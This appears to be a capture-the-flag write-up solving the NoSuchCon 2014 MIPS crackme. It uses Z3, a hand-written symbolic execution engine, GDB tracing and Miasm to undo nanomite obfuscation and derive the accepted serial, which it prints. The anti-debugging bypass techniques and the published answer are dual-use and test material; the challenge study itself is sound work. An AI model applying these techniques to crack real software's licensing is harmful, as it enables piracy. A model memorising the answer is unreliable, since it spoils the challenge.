(let ((?x464 (concat ((_ extract 22 22) ?x354) (bvnot ((_ extract 21 21) ?x354)) (bvnot ((_ extract 20 18) ?x354)) ((_ extract 17 13) ?x354) (bvnot ((_ extract 12 10) ?x354)) ((_ extract 9 8) ?x354) (bvnot ((_ extract 7 7) ?x354)) ((_ extract 6 5) ?x354) (bvnot ((_ extract 4 4) ?x354)) (bvnot ((_ extract 3 3) ?x354)) (bvnot ((_ extract 2 2) ?x354)) (bvor ((_ extract 1 1) ?x337) ((_ extract 1 1) ?x342)) (bvnot (bvor ((_ extract 0 0) ?x337) ((_ extract 0 0) ?x342))) (bvnot ((_ extract 31 31) ?x354)) ((_ extract 30 30) ?x354) (bvnot ((_ extract 29 28) ?x354)) ((_ extract 27 27) ?x354))))
(let ((?x474 (concat (bvadd (_ bv141595581 28) (bvnot (bvxor (bvadd (_ bv178553293 28) ?x464) (concat (_ bv0 2) ?x26)))) ((_ extract 31 28) (bvadd (_ bv4168127421 32) (bvnot (bvxor (bvadd (_ bv2594472397 32) ?x414) ?x27)))))))
(let ((?x495 (bvadd (_ bv1994801052 32) (bvxor (_ bv1407993787 32) (bvor (bvshl ?x474 ?x20) (bvlshr ?x474 ?x24)) ?x27) ?x42)))
(let ((?x392 (concat (bvor ((_ extract 13 0) (bvlshr ?x495 ?x20)) ((_ extract 13 0) (bvshl ?x495 ?x24))) (bvor ((_ extract 31 14) (bvlshr ?x495 ?x20)) ((_ extract 31 14) (bvshl ?x495 ?x24))))))
(let ((?x388 (bvlshr ?x392 ?x24)))
(let ((?x494 (concat (bvnot (bvor ((_ extract 31 31) (bvshl ?x392 ?x20)) ((_ extract 31 31) ?x388))) (bvor ((_ extract 30 30) (bvshl ?x392 ?x20)) ((_ extract 30 30) ?x388)) (bvnot (bvor ((_ extract 29 27) (bvshl ?x392 ?x20)) ((_ extract 29 27) ?x388))) (bvor ((_ extract 26 25) (bvshl ?x392 ?x20)) ((_ extract 26 25) ?x388)) (bvnot (bvor ((_ extract 24 23) (bvshl ?x392 ?x20)) ((_ extract 24 23) ?x388))) (bvor ((_ extract 22 21) (bvshl ?x392 ?x20)) ((_ extract 22 21) ?x388)) (bvnot (bvor ((_ extract 20 16) (bvshl ?x392 ?x20)) ((_ extract 20 16) ?x388))) (bvor ((_ extract 15 15) (bvshl ?x392 ?x20)) ((_ extract 15 15) ?x388)) (bvnot (bvor ((_ extract 14 14) (bvshl ?x392 ?x20)) ((_ extract 14 14) ?x388))) (bvor ((_ extract 13 12) (bvshl ?x392 ?x20)) ((_ extract 13 12) ?x388)) (bvnot (bvor ((_ extract 11 10) (bvshl ?x392 ?x20)) ((_ extract 11 10) ?x388))) (bvor ((_ extract 9 8) (bvshl ?x392 ?x20)) ((_ extract 9 8) ?x388)) (bvnot (bvor ((_ extract 7 2) (bvshl ?x392 ?x20)) ((_ extract 7 2) ?x388))) (bvor ((_ extract 1 1) (bvshl ?x392 ?x20)) ((_ extract 1 1) ?x388)) (bvnot (bvor ((_ extract 0 0) (bvshl ?x392 ?x20)) ((_ extract 0 0) ?x388))))))
(let ((?x450 (bvor (bvlshr ?x494 ?x20) (bvshl ?x494 ?x24))))
(bvor (bvlshr ?x450 ?x20) (bvshl ?x450 ?x24)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
</code></p>

<p>Quite happy we don&rsquo;t have to study that right?</p>

<h3>Extracting the function that generates the new program counter from the second magic value</h3>

<p>For the second big block of code, we can do exactly the same thing: copy the code, configure the virtual environment with our symbolic variables and wrap the function:</p>

<p>`&ldquo;python solve_nsc2014_step1_z3.py@generate_new_pc_from_magic_high/extract_equation_of_function_that_generates_new_son_pc
def extract_equation_of_function_that_generates_new_son_pc():
  &rdquo;&lsquo;Extract the formula of the function generating the new son&rsquo;s $pc&rsquo;&lsquo;&rsquo;
  x = mini_mips_symexec_engine.MiniMipsSymExecEngine(&lsquo;function_that_generates_new_son_pc.log&rsquo;)
  x.debug = False
  x.enable_z3 = True
  tmp_pc = BitVec(&lsquo;magic&rsquo;, 32)
  n_loop = BitVec(&lsquo;n_loop&rsquo;, 32)
  x.stack[&lsquo;tmp_pc&rsquo;] = tmp_pc
  x.stack[&lsquo;var_2F0&rsquo;] = n_loop
  emu_generate_new_pc_for_son(x, print_final_state = False)
  compute_pc_equation = simplify(x.gpr[&lsquo;v0&rsquo;])
  with open(os.path.join(&lsquo;formulas&rsquo;, &lsquo;generate_new_pc_son.smt2&rsquo;), &lsquo;w&rsquo;) as f:</p>

<pre><code>f.write(to_SMT2(compute_pc_equation, name = 'generate_new_pc_son'))
</code></pre>

<p>  return tmp_pc, n_loop, compute_pc_equation</p>

<p>var_new_pc, var_n_loop, expr_new_pc = [None]*3
def generate_new_pc_from_magic_high(magic_high, n_loop):
  global var_new_pc, var_n_loop, expr_new_pc
  if var_new_pc is None and var_n_loop is None and expr_new_pc is None:</p>

<pre><code>var_new_pc, var_n_loop, expr_new_pc = extract_equation_of_function_that_generates_new_son_pc()
</code></pre>

<p>  return substitute(</p>

<pre><code>  expr_new_pc,
  (var_new_pc, BitVecVal(magic_high, 32)),
  (var_n_loop, BitVecVal(n_loop, 32))
</code></pre>

<p>  ).as_long()
```</p>

<p>If you are interested in what the formula looks like, it is also available in the <a href="https://github.com/0vercl0k/stuffz/tree/master/NoSuchCon2014">NoSuchCon2014 folder</a> on my <a href="https://github.com/0vercl0k">github</a>.</p>

<h3>Putting it all together: building a function that computes the new program counter of the son</h3>

<p>Obviously, we don&rsquo;t really care about those two previous functions, we just want to combine them together to implement the computation of the new program counter from both the round number &amp; where the son <em>SIGTRAP</em>&rsquo;d. The only missing bits is the lookup in the <em>QWORD</em>s array to extract the <em>second magic value</em>. We just have to dump the array inside another file called <em>memory.py</em>. This is done with a simple IDA Python one-liner:</p>

<p><code>python Dump the QWORD array with IDAPy
values = dict((0x00414130+i*8, Qword(0x00414130+i*8)) for i in range(0x25E))
</code></p>

<p>Now, we can build the whole function easily by combining all those pieces:</p>

<p>`&ldquo;python solve_nsc2014_step1_z3.py@generate_new_pc_from_pc_son_using_z3
def generate_new_pc_from_pc_son_using_z3(pc_son, n_break):
  &rdquo;&lsquo;Generate the new program counter from the address where the son SIGTRAP&rsquo;d and
  the number of SIGTRAP the son encountered&rsquo;&lsquo;&rsquo;
  loop_n = (n_break / 101)
  magic = generate_magic_from_son_pc_using_z3(pc_son, n_break)
  idx = None
  for i in range(len(memory.pcs)):</p>

<pre><code>if (memory.pcs[i] &amp; 0xffffffff) == magic:
  idx = i
  break
</code></pre>

<p>  assert(idx != None)
  return generate_new_pc_from_magic_high(memory.pcs[idx] >> 32, loop_n)
```</p>

<p>Sweet. Really sweet.</p>

<p>This basically means we are now able to <em>unscramble</em> the code of the son and reordering it completely without even physically running the binary nor generating traces.</p>

<h2>Unscramble the code like a sir</h2>

<p>Before showing, the code I just want to explain the process one more time:</p>

<ol>
<li> The son executes some code until it reaches a <em>break</em> instruction</li>
<li> The father gets the <em>$pc</em> of the son and the variable that counts the number of <em>break</em> instruction the son executed</li>
<li> The father generates a new <em>$pc</em> value from those two variables</li>
<li> The father sets the new <em>$pc</em></li>
<li> The father continues its son</li>
<li> Goto 1!</li>
</ol>


<p>So basically to unscramble the code, we just need to simulate what the father would do &amp; log everything somewhere. Couple of important details though:</p>

<ul>
<li>There are exactly 101 <em>break</em> instructions in the son, so 101 <em>chunks</em> of code will be executed and need to be <em>reordered</em>,</li>
<li>The son is executing 6 <em>rounds</em> ; that&rsquo;s exactly why the <em>QWORD</em> array has 6*101 entries.</li>
</ul>


<p>Here is the function I used:</p>

<p>```python solve_nsc2014_step1_z3.py@generate_son_code_reordered
def generate_son_code_reordered(debug = False):</p>

<pre><code>'''This functions puts in the right order the son's block of codes without
relying on the father to set a new $pc value when a break is executed in the son.
With this output we are good to go to create a nanomites-less binary:
  - We don't need the father anymore (he was driving the son)
  - We have the code in the right order, so we can also remove the break instructions
It will also be quite useful when we want to execute symbolic-ly its code.
'''
def parse_line(l):
    addr_seg, instr, _ = l.split(None, 2)
    _, addr = addr_seg.split(':')
    return int('0x%s' % addr, 0), instr

son_code = code.block_code_of_son
next_break = 0
n_break = 0
cleaned_code = []
for _ in range(6):
    for z in range(101):
        i = 0
        while i &lt; len(son_code):
            line = son_code[i]
            addr, instr = parse_line(line)
            if instr == 'break' and (next_break == addr or z == 0):
                break_addr = addr
                new_pc = generate_new_pc_from_pc_son_using_z3(break_addr, n_break)
                n_break += 1
                if debug:
                    print '; Found the %dth break (@%.8x) ; new pc will be %.8x' % (z, break_addr, new_pc)
                state = 'Begin'
                block = []
                j = 0
                while j &lt; len(son_code):
                    line = son_code[j]
                    addr, instr = parse_line(line)
                    if state == 'Begin':
                        if addr == new_pc:
                            block.append(line)
                            state = 'Log'
                    elif state == 'Log':
                        if instr == 'break':
                            next_break = addr
                            state = 'End'
                        else:
                            block.append(line)
                    elif state == 'End':
                        break
                    else:
                        pass
                    j += 1

                if debug:
                    print ';', '='*25, 'BLOCK %d' % z, '='*25
                    print '\n'.join(block)
                cleaned_code.extend(block)
                break
            i += 1

return cleaned_code
</code></pre>

<p>```</p>

<p>And there it is :&ndash;)</p>

<p>The function outputs the unrolled and ordered code of the son. If you want to push further, you could theoretically perform an open-heart surgery to completely remove the nanomites from the original binary, isn&rsquo;t it cool? This is left as an exercise for the interested reader though :&ndash;)).</p>

<h2>Attacking the son: the last man standing</h2>

<p>Now that we have the code unscrambled, we can directly feed it to our engine but before doing so here are some details:</p>

<ul>
<li>As we said earlier, it looks like the son is executing 6 times the same code. This is not the case <strong>at all</strong>, every round will execute the same amount of instructions but not in the same order</li>
<li>The computations executed can be seen as some kind of light encoding/encryption or decoding/decryption algorithm</li>
<li>We have 6 <em>rounds</em> because the input serial is broken into 6 <em>DWORD</em>s (so 6 symbolic variables) ; so basically each round is going to generate an output <em>DWORD</em></li>
</ul>


<p>As previously, we need to copy the code we want to execute. Note that we can also use <em>generate_son_code_reorganized</em> to generate it dynamically. Next step is to configure the virtual environment and we are good to finally run the code:</p>

<p>```python solve_nsc2014_step1_z3@get_serial first part
def get_serial():
  print &lsquo;> Instantiating the symbolic execution engine..&rsquo;
  x = mini_mips_symexec_engine.MiniMipsSymExecEngine(&lsquo;decrypt_serial.log&rsquo;)
  x.enable_z3 = True</p>

<p>  print &lsquo;> Generating dynamically the code of the son &amp; reorganizing/cleaning it..&rsquo;
  # If you don&rsquo;t want to generate it dynamically like a sir, I&rsquo;ve copied a version inside
  # code.block_code_of_son_reorganized_loop_unrolled :&ndash;)
  x.code = generate_son_code_reorganized()</p>

<p>  print &lsquo;> Configuring the virtual environement..&rsquo;
  x.gpr[&lsquo;fp&rsquo;] = 0x7fff6cb0
  x.stack_offsets[&lsquo;var_30&rsquo;] = 24
  start_addr = x.gpr[&lsquo;fp&rsquo;] + x.stack_offsets[&lsquo;var_30&rsquo;] + 8
  # (gdb) x/6dwx $s8+24+8
  # 0x7fff6cd0:     0x11111111      0x11111111      0x11111111
  #                 0x11111111      0x11111111      0x11111111
  a, b, c, d, e, f = BitVecs(&lsquo;a b c d e f&rsquo;, 32)
  x.mem[start_addr +  0] = a
  x.mem[start_addr +  4] = b
  x.mem[start_addr +  8] = c
  x.mem[start_addr + 12] = d
  x.mem[start_addr + 16] = e
  x.mem[start_addr + 20] = f</p>

<p>  print &lsquo;> Running the code..&rsquo;
  x.run()
```</p>

<p>The thing that matters this time is to find <em>a, b, c, d, e, f</em> so that they generate specific outputs ; so this is where <a href="https://z3.codeplex.com/">Z3</a> is going to help us a <strong>lot</strong>. Thanks to that guy we don&rsquo;t need to manually invert the algorithm.</p>

<p>The final bit now is basically just about setting up the solver, setting the correct constraints and generating the serial you guys have been waiting for so long:</p>

<p>```python solve_nsc2014_step1_z3@get_serial second part
  print &lsquo;> Instantiating &amp; configuring the solver..&rsquo;
  s = Solver()
  s.add(</p>

<pre><code>x.mem[start_addr +   0] == 0x7953205b, x.mem[start_addr +   4] == 0x6b63616e,
x.mem[start_addr +   8] == 0x20766974, x.mem[start_addr +  12] == 0x534e202b, 
x.mem[start_addr +  16] == 0x203d2043, x.mem[start_addr +  20] == 0x5d20333c,
</code></pre>

<p>  )</p>

<p>  print &lsquo;> Solving..&rsquo;
  if s.check() == sat:</p>

<pre><code>print '&gt; Constraints solvable, here are the 6 DWORDs:'
m = s.model()
for i in (a, b, c, d, e, f):
  print ' %r = 0x%.8X' % (i, m[i].as_long())

print '&gt; Serial:', ''.join(('%.8x' % m[i].as_long())[::-1] for i in (a, b, c, d, e, f)).upper()
</code></pre>

<p>  else:</p>

<pre><code>print '! Constraints unsolvable'
</code></pre>

<p>```</p>

<p>There we are, the final moment; <em>drum roll</em></p>

<p>```text python solve_nsc2014_step1_z3.py + YAY</p>

<h1>PS D:\Codes\NoSuchCon2014> python .\solve_nsc2014_step1_z3.py</h1>

<h1>Tests OK &mdash; you are fine to go</h1>

<blockquote><p>Instantiating the symbolic execution engine..
Generating dynamically the code of the son &amp; reorganizing/cleaning it..
Configuring the virtual environement..
Running the code..
Instantiating &amp; configuring the solver..
Solving..
Constraints solvable, here are the 6 DWORDs:
 a = 0xFE446223
 b = 0xBA770149
 c = 0x75BA5111
 d = 0x78EA3635
 e = 0xA9D6E85F
 f = 0xCC26C5EF</p>

<h1>Serial: 322644EF941077AB1115AB575363AE87F58E6D9AFE5C62CC</h1></blockquote>

<p>overclok@wildout:~/chall/nsc2014$ ./start_vm.sh
[    0.000000] Initializing cgroup subsys cpuset
[&hellip;]
Debian GNU/Linux 7 debian-mipsel ttyS0</p>

<p>debian-mipsel login: root
Password:
[&hellip;]
root@debian-mipsel:~# /home/user/crackmips 322644EF941077AB1115AB575363AE87F58E6D9AFE5C62CC
good job!
Next level is there: <a href="http://nsc2014.synacktiv.com:65480/oob4giekee4zaeW9/">http://nsc2014.synacktiv.com:65480/oob4giekee4zaeW9/</a>
```</p>

<p>Boom :&ndash;).</p>

<h1>Alternative solution</h1>

<p>In this part, I present an alternate solution to solve the challenge. It&rsquo;s somehow a shortcut, since it requires much less coding than Axel&rsquo;s one, and uses the awesome <a href="https://code.google.com/p/miasm/">Miasm</a> framework.</p>

<h2>Shortcut #1 : Tracing the parent with GDB</h2>

<h3>Quick recap of the parent&rsquo;s behaviour</h3>

<p>As Axel has previously explained, the first step is to recover the child&rsquo;s execution flow. Because of <em>nanomites</em>, the child is driven by the parent; we have to analyze the parent (i.e. the <code>debug</code> function) first to determine the correct sequence of the child&rsquo;s <code>pc</code> values.</p>

<p>The parent&rsquo;s main loop is obfuscated, but by browsing cross-references of stack variables in IDA, we can see where each one is used. After a bit of analysis, we can try to decompile by hand the algorithm, and write a pseudo-Python code description of what the <code>debug</code> function does (it is really simplified):</p>

<p>```python debug_pseudo_code.py
counter = 0
waitpid()</p>

<p>while(True):</p>

<pre><code>regs = ptrace(GETREGS)

# big block 1
addr = regs.pc
param = f(counter)
addr = obfu1(addr, param)

for i in range(605):
    entry = pcs[i]  # entry is 8 bytes long (2 dwords)
    if(addr == entry.first_dword):
        addr = entry.second_dword
        break

# big block 2
addr = obfu2(addr, param)

regs.pc = addr
ptrace(SETREGS, regs)
counter += 1

if(not waitpid()):
    break
</code></pre>

<p>```</p>

<p>The &ldquo;big blocks&rdquo; are the two long assembly blocks preceding and following the inner loop. Without looking at the gory details, we understand that a <code>param</code> value is derived from the counter using a function that I call <code>f</code>, and then used to obfuscate the original child&rsquo;s <code>pc</code>. The result is then searched in a <code>pcs</code> array (stored at address <code>0414130</code>), the next dword is extracted and used in a 2nd obfuscation pass to finally produce the new <code>pc</code> value injected into the child.</p>

<p>The most important fact here is that that this process does not involve the input key at anytime. <strong>The output <code>pc</code> sequence is deterministic and constant</strong>; two executions with two different keys will produce the same sequence of <code>pc</code>&rsquo;s. Since we know the first value of <code>pc</code> (the first <code>break</code> instruction at 040228C), we can theoretically compute the correct sequence and then reorder the child&rsquo;s instructions according to this sequence.</p>

<p>We have two approaches for doing so:</p>

<ul>
<li>statical analysis: somehow understand each instruction used in obfuscation passes and rewrite the algorithm producing the correct sequence. This is the <a href="#static_analysis_father">path followed by Axel</a>.</li>
<li>dynamic analysis: trace the program once and log all pc values.</li>
</ul>


<p>Although the first one is probably the most interesting, the second is certainly the fastest. Again, it only works because the input key does not influence the output <code>pc</code> sequence. And we&rsquo;re lucky: the child is already debugged by the parent, but nothing prevents us to debug the parent itself.</p>

<h3>First attempt at tracing</h3>

<p>Tracing is pretty straightforward with GDB using <code>bp</code> and <code>commands</code>. In order to understand the parent&rsquo;s algorithm a bit better, I first wrote a pretty verbose GDB script that prints the loop counter, <code>param</code> variable as well as the original and new child&rsquo;s <code>pc</code> for each iteration. I chose to put two breakpoints:</p>

<ul>
<li>The first one at the end of the first obfuscation blocks (0x401440)</li>
<li>The second one before the <code>ptrace</code> call at the end of the second block (0x0401D8C), in order to be able to read the child&rsquo;s <code>pc</code> manipulated by the parent.</li>
</ul>


<p>Here is the script:</p>

<p>```text gdb_trace1_script.txt</p>

<h6>#</h6>

<h1>A few handy functions</h1>

<h6>#</h6>

<p>def print_context_pc</p>

<pre><code>printf "regs.pc = 0x%08x\n", *(int*)($fp-0x1cc)
</code></pre>

<p>end</p>

<p>def print_param</p>

<pre><code>printf "param = 0x%08x\n", *(int*)($fp-0x2f0)
</code></pre>

<p>end</p>

<p>def print_addr</p>

<pre><code>printf "addr = 0x%08x\n", *(int*)($fp-0x2fc)
</code></pre>

<p>end</p>

<p>def print_counter</p>

<pre><code>printf "counter = %d\n", *(int*)($fp-0x300)
</code></pre>

<p>end</p>

<h6>#</h6>

<p>set pagination off
set confirm off
file crackmips
target remote 127.0.0.1:4444 # gdbserver address</p>

<h1>break at the end of block 1</h1>

<p>b *0x401440
commands
silent
printf &ldquo;\nNew round\n&rdquo;
print_counter
print_context_pc
print_param
print_addr
c
end</p>

<h1>break before the end of block 2</h1>

<p>b *0x0401D8C
commands
silent
print_context_pc
c
end</p>

<p>c
```</p>

<p>To run that script within GDB, we first need to start <code>crackmips</code> with gdbserver in our <code>qemu</code> VM. After a few minutes, we get the following (cleaned) trace:</p>

<p>```text gdb_trace1.txt
New round
counter = 0
regs.pc = 0x0040228c
param = 0x00000000
addr = 0xcd0e9f0e
regs.pc = 0x00402290</p>

<p>New round
counter = 1
regs.pc = 0x004022bc
param = 0x00000000
addr = 0xcd0e99ae
regs.pc = 0x00402ce0</p>

<p>New round
counter = 2
regs.pc = 0x00402d0c
param = 0x00000000
addr = 0xcd0e420e
regs.pc = 0x00402da8</p>

<p>[&hellip;]
```</p>

<p>By reading the trace further, we realize that <code>param</code> is always equal to <code>counter/101</code>. This is actually the child&rsquo;s own loop counter, since its big loop is made of 101 pseudo basic blocks. We also notice that the <code>pc</code> sequence is different for each child&rsquo;s loop: round 0 is not equal to round 101, etc.</p>

<h3>Getting a clean trace</h3>

<p>Since we&rsquo;re only interested in the final <code>pc</code> value for each round, we can make a simpler script that just outputs those values. And organize them in a parsable format to be able to use them later in another script. Here is the version 2 of the script:</p>

<p>```text gdb_trace2_script.txt
def print_context_pc</p>

<pre><code>printf "0x%08x\n", *(int*)($fp-0x1cc)
</code></pre>

<p>end</p>

<p>set pagination off
set confirm off
file crackmips
target remote 127.0.0.1:4444</p>

<h1>break before the end of block 2</h1>

<p>b *0x0401D8C
commands
silent
print_context_pc
c
end</p>

<p>c
```</p>

<p>The cleaned trace only contains the 606 <code>pc</code> values, one on each line:</p>

<p><code>text gdb_trace.txt
0x00402290
0x00402ce0
0x00402da8
0x00403550
[...]
0x004030e4
0x004039dc
</code></p>

<p>Mission 1: accomplished!</p>

<h2>Shortcut #2 : Symbolic execution using Miasm</h2>

<p>We now have the list of each start address of each basic block executed by the child. The next step is to understand what each one of them does, and reorder them to reproduce the whole algorithm.</p>

<p>Even though <a href="#writing_symbolic_exec">writing a symbolic execution engine from scratch</a> is certainly a fun and interesting exercise, I chose to play with <a href="https://code.google.com/p/miasm/">Miasm</a>. This excellent framework can disassemble binaries in various architectures (among which x86, x64, ARM, MIPS, etc.), and convert them into an intermediate language called IR (<em>intermediate representation</em>). It is then able to perform symbolic execution on this IR in order to find what are the side effects of a basic block on registers and memory locations. Although there is not so much documentation, Miasm contains various <a href="https://code.google.com/p/miasm/source/browse/#hg%2Fexample">examples</a> that should make the API easier to dig in. Don&rsquo;t tell me that it is hard to install, it is really not (well, I haven&rsquo;t tried on Windows ;). And there is even a <a href="https://registry.hub.docker.com/u/miasm/base/">docker image</a>, so you have no excuse to not try it!</p>

<h3>Miasm symbolic execution 101</h3>

<p>Before scripting everything, let&rsquo;s first see how to use Miasm to perform symbolic execution of one basic block. For the sake of simplicity, let&rsquo;s work on the first basic block of the child&rsquo;s main loop.</p>

<p>```python miasm_example.py (1/5)
from miasm2.analysis.machine import Machine
from miasm2.analysis import binary</p>

<p>bi = binary.Container(&ldquo;crackmips&rdquo;)
machine = Machine(&lsquo;mips32l&rsquo;)
mn, dis_engine_cls, ira_cls = machine.mn, machine.dis_engine, machine.ira
```</p>

<p>First, we open the crackme using the generic <code>Container</code> class. It automatically detects the executable format and uses <em>Elfesteem</em> to parse it. Then we use the handy <code>Machine</code> class to get references to useful classes we&rsquo;ll use to disassemble and analyze the binary.</p>

<p>```python miasm_example.py (2/5)
BB_BEGIN = 0x00402290
BB_END = 0x004022BC</p>

<h1>Disassemble between BB_BEGIN and BB_END</h1>

<p>dis_engine = dis_engine_cls(bs=bi.bs)
dis_engine.dont_dis = [BB_END]
bloc = dis_engine.dis_bloc(BB_BEGIN)
print &lsquo;\n&rsquo;.join(map(str, bloc.lines))
```</p>

<p>Here, we disassemble a single basic block, by explicitly telling Miasm its start and end address. The disassembler is created by instantiating the <code>dis_engine_cls</code> class. <code>bi.bs</code> represents the binary stream we are working on. I admit the <code>dont_dis</code> syntax is a bit weird; it is used to tell Miasm to stop disassembling when it reaches a given address. We do it here because the next instruction is a <code>break</code>, and Miasm does not normally think it is the end of a basic block. When you run those lines, you should get this output:</p>

<p><code>text miasm_example.py output
LW         V1, 0x38(FP)
SLL        V0, V1, 0x2
ADDIU      A0, FP, 0x18
ADDU       V0, A0, V0
LW         A0, 0x8(V0)
LW         V0, 0x38(FP)
SUBU       A0, A0, V0
SLL        V0, V1, 0x2
ADDIU      V1, FP, 0x18
ADDU       V0, V1, V0
SW         A0, 0x8(V0)
</code></p>

<p>Okay, so we know how to disassemble a block with Miasm. Let&rsquo;s now see how to convert it into the Intermediate Representation:</p>

<p>```python miasm_example.py (3/5)</p>

<h1>Transform to IR</h1>

<p>ira = ira_cls()
irabloc = ira.add_bloc(bloc)[0]
print &lsquo;\n&rsquo;.join(map(lambda b: str(b[0]), irabloc.irs))
```</p>

<p>We instantiated the <code>ira_cls</code> class and called its <code>add_bloc</code> method. It takes a basic block as input and outputs a list of IR basic blocs; here we know that we&rsquo;ll get only one, so we use <code>[0]</code>. Let&rsquo;s see what is the output of those lines:</p>

<p><code>text miasm_sample.py output
V1 = @32[(FP+0x38)]
V0 = (V1 &lt;&lt; 0x2)
A0 = (FP+0x18)
V0 = (A0+V0)
A0 = @32[(V0+0x8)]
V0 = @32[(FP+0x38)]
A0 = (A0+(- V0))
V0 = (V1 &lt;&lt; 0x2)
V1 = (FP+0x18)
V0 = (V1+V0)
@32[(V0+0x8)] = A0
IRDst = loc_00000000004022BC:0x004022bc
</code></p>

<p>Each one of those lines are instructions in Miasm&rsquo;s IR language. It is pretty easy: each instruction is described as a list of side-effects it has on some variables, using expressions and affectations. <code>@32[...]</code> represents a 32-bit memory access; when it&rsquo;s on the left of an <code>=</code> sign, it&rsquo;s a <em>write</em> access, when it&rsquo;s on the right it&rsquo;s a <em>read</em>. The last line uses the pseudo-register <code>IRDst</code>, which is kind of the IR&rsquo;s <code>pc</code> register. It tells Miasm where is located the next basic block.</p>

<p>Great! Let&rsquo;s see now how to perform symbolic execution on this IR basic block.</p>

<p>```python miasm_example.py (4/5)
from miasm2.expression.expression import *
from miasm2.ir.symbexec import symbexec
from miasm2.expression.simplifications import expr_simp</p>

<h1>Prepare symbolic execution</h1>

<p>symbols_init = {}
for i, r in enumerate(mn.regs.all_regs_ids):</p>

<pre><code>symbols_init[r] = mn.regs.all_regs_ids_init[i]
</code></pre>

<h1>Perform symbolic exec</h1>

<p>sb = symbexec(ira, symbols_init)
sb.emulbloc(irabloc)</p>

<p>mem, exprs = sb.symbols.symbols_mem.items()[0]
print &ldquo;Memory changed at %s :&rdquo; % mem
print &ldquo;\tbefore:&rdquo;, exprs[0]
print &ldquo;\tafter:&rdquo;, exprs[1]
```</p>

<p>The first lines are initializing the symbol pool used for symbolic execution. We then use the <code>symbexec</code> module to create an execution engine, and we give it our fresh IR basic block. The result of the execution is readable by browsing the attributes of <code>sb.symbols</code>. Here I am mainly interested on the memory side-effects, so I use <code>symbols_mem.items()</code> to list them. <code>symbols_mem</code> is actually a dict whose keys are the memory locations that changed during execution, and values are pairs containing both the previous value that was in that memory cell, and the new one. There&rsquo;s only one change, and here it is:</p>

<p><code>text miasm_example.py output
Memory changed at (FP_init+(@32[(FP_init+0x38)] &lt;&lt; 0x2)+0x20) :
  before: @32[(FP_init+(@32[(FP_init+0x38)] &lt;&lt; 0x2)+0x20)]
  after: (@32[(FP_init+(@32[(FP_init+0x38)] &lt;&lt; 0x2)+0x20)]+(- @32[(FP_init+0x38)]))
</code></p>

<p>The expressions are getting a bit more complex, but still pretty readable. <code>FP_init</code> represents the value of the <code>fp</code> register at the beginning of execution. We can clearly see that a memory location as modified since a value was subtracted from it. But we can do better: we can give Miasm simplification rules in order to make this output much more readable. Let&rsquo;s do it!</p>

<p>```python miasm_example.py (5/5)</p>

<h1>Simplifications</h1>

<p>fp_init = ExprId(&lsquo;FP_init&rsquo;, 32)
zero_init = ExprId(&lsquo;ZERO_init&rsquo;, 32)
e_i_pattern = expr_simp(ExprMem(fp_init + ExprInt32(0x38), 32))
e_i = ExprId(&lsquo;i&rsquo;, 32)
e_pass_i_pattern = expr_simp(ExprMem(fp_init + (e_i &lt;&lt; ExprInt32(2)) + ExprInt32(0x20), 32))
e_pass_i = ExprId(&ldquo;pwd[i]&rdquo;, 32)</p>

<p>simplifications = {e_i_pattern      : e_i,</p>

<pre><code>               e_pass_i_pattern : e_pass_i,
               zero_init        : ExprInt32(0) }
</code></pre>

<p>def my_simplify(expr):</p>

<pre><code>expr2 = expr.replace_expr(simplifications)
return expr2
</code></pre>

<p>print &ldquo;%s = %s&rdquo; % (my_simplify(exprs[0]) ,my_simplify(exprs[1]))
```</p>

<p>Here we declare 3 replacement rules:</p>

<ul>
<li>Replace <code>@32[(FP_init+0x38)]</code> with <code>i</code></li>
<li>Replace <code>@32[(FP_init+(i &lt;&lt; 0x2)+0x20)]</code> with <code>pwd[i]</code></li>
<li>Replace <code>ZERO_init</code> with 0 (although it is not really useful here)</li>
</ul>


<p>There is actually a more generic way to do it using pattern matching rules with jokers, but we don&rsquo;t really need this machinery here. This the result we get after simplification:</p>

<p><code>text miasm_example.py final output
pwd[i] = (pwd[i]+(- i))
</code></p>

<p>That&rsquo;s all! So all this basic block does is a subtraction. What is nice is that the output is actually valid Python code :). This will be very useful in the last part.</p>

<h3>Generating the child&rsquo;s algorithm</h3>

<p>So in less than 60 lines, we were able to disassemble an arbitrary basic block, perform symbolic execution on it and get a pretty understandable result. We just need to apply this logic to the 100 remaining blocks, and we&rsquo;ll have a pythonic version of each one of them. Then, we simply reorder them using the GDB trace we got from the previous part, and we&rsquo;ll be able to generate 606 python lines describing the whole algorithm.</p>

<p>Here is an extract of the script automating all of this:</p>

<p>```python miasm_symbexec.py
def load_trace(filename):</p>

<pre><code>return [int(x.strip(), 16) for x in open(filename).readlines()]
</code></pre>

<p>def boundaries_from_trace(trace):</p>

<pre><code>bb_starts = sorted(set(trace))
boundaries = [(bb_starts[i], bb_starts[i+1]-4) for i in range(len(bb_starts)-1)]
boundaries.append((0x4039DC, 0x04039E8)) # last basic bloc, added by hand
return boundaries
</code></pre>

<p>def exprs2str(exprs):</p>

<pre><code>return ' = '.join(str(e) for e in exprs)
</code></pre>

<p>trace = load_trace(&ldquo;gdb_trace.txt&rdquo;)
boundaries = boundaries_from_trace(trace)</p>

<p>print &ldquo;# Building IR blocs &amp; expressions for all basic blocks&rdquo;
bb_exprs = []
for zone in boundaries:</p>

<pre><code>bb_exprs.append(analyse_bb(*zone))
</code></pre>

<p>print &ldquo;# Reconstructing the whole algorithm based on GDB trace&rdquo;
bb_starts = [x[0] for x in boundaries]
for bb_ea in trace:</p>

<pre><code>bb_index = bb_starts.index(bb_ea)
#print "%x : %s" % (bb_ea, exprs2str(bb_exprs[bb_index]))
print exprs2str(bb_exprs[bb_index])
</code></pre>

<p>```</p>

<p>The <code>analyse_bb()</code> function perform symbolic execution on a single basic block, given its start and end addresses. This is just wrapping what we&rsquo;ve been doing so far into a function. The GDB trace is opened, parsed, and a list of basic block addresses is built from it (we cheat a little bit for the last one of the loop, by hardcoding it). Each basic block is analyzed and the resulting expressions are pushed into the <code>bb_exprs</code> list. Then the GDB trace is processed, by outputting the expressions corresponding to each basic block.</p>

<p>This is what we get:</p>

<p>```python output_algo.py</p>

<h1>Building IR blocs &amp; expressions for all basic blocks</h1>

<h1>Reconstructing the whole algorithm based on GDB trace</h1>

<p>pwd[i] = (pwd[i]+(&ndash; i))
pwd[i] = ((0x0|pwd[i])<sup>0xFFFFFFFF</sup>)
pwd[i] = (pwd[i]^i)
pwd[i] = (pwd[i]^i)
pwd[i] = (pwd[i]+0x3ECA6F23)
pwd[i] = (pwd[i]+0x6EDC032)
[&hellip;]
pwd[i] = ((pwd[i] &lt;&lt; 0x14)|(pwd[i] >> 0xC))
